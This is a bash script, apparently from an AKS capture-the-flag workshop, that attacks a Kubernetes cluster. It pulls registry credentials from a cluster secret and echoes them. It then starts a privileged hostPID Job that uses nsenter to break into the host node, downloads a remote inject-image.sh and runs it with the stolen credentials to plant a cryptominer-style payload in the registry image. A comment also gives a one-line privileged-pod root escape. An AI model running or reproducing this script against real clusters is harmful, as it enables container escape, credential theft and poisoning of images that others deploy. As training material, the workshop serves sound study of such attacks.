#!/bin/bash
echo "HOSTNAME = " $HOSTNAME
IMAGE=$(kubectl get pod $HOSTNAME -o json  | jq '.spec.containers[0].image' -r)
echo "IMAGE =" $IMAGE
[[ -z "$IMAGE" ]] && { echo "Unable to determine the image" ; exit 1; }

REGISTRY_HOSTNAME=$(echo $IMAGE | cut -d/ -f1)
echo "REGISTRY_HOSTNAME = " $REGISTRY_HOSTNAME
[[ -z "$REGISTRY_HOSTNAME" ]] && { echo "Unable to determine the registry hostname" ; exit 1; }

# Get the registry username and password from acr-secret
REGISTRY_USERNAME=$(kubectl get secrets/acr-secret -o json | jq -r '.data.".dockerconfigjson"' | base64 -d - | jq ".auths.\"${REGISTRY_HOSTNAME}\".username" -r)
REGISTRY_PASSWORD=$(kubectl get secrets/acr-secret -o json | jq -r '.data.".dockerconfigjson"' | base64 -d - | jq ".auths.\"${REGISTRY_HOSTNAME}\".password" -r)
echo "REGISTRY_USERNAME = " $REGISTRY_USERNAME
echo "REGISTRY_PASSWORD = " $REGISTRY_PASSWORD
[[ -z "$REGISTRY_USERNAME" ]] && { echo "Unable to determine the registry username" ; exit 1; }
[[ -z "$REGISTRY_PASSWORD" ]] && { echo "Unable to determine the registry password" ; exit 1; }

# Based off of 
# kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
# Cleanup in case anything is still running
kubectl delete job bitcoin-injector

kubectl apply -f - <<EOF
apiVersion: batch/v1
kind: Job
metadata:
  name: bitcoin-injector
spec:
  backoffLimit: 0  # Stop after the first failure
  template:
    spec:
      containers:
      - name: bitcoininjector
        image: alpine
        args:
        - nsenter
        - --mount=/proc/1/ns/mnt
        - --
        - bash
        - -c
        - "rm -f inject-image.sh && curl -O -J https://raw.githubusercontent.com/azure/aks-ctf/refs/heads/main/workshop/scenario_3/inject-image.sh && bash inject-image.sh $IMAGE $REGISTRY_USERNAME $REGISTRY_PASSWORD"
        imagePullPolicy: Always
        securityContext:
          privileged: true
      restartPolicy: Never
      hostPID: true
EOF

kubectl wait -n dev --for=condition=complete job/bitcoin-injector --timeout=60s

#kubectl run bitcoin-injector --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"docker.io/lastcoolnameleft/bitcoin-injector:latest","command":["/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
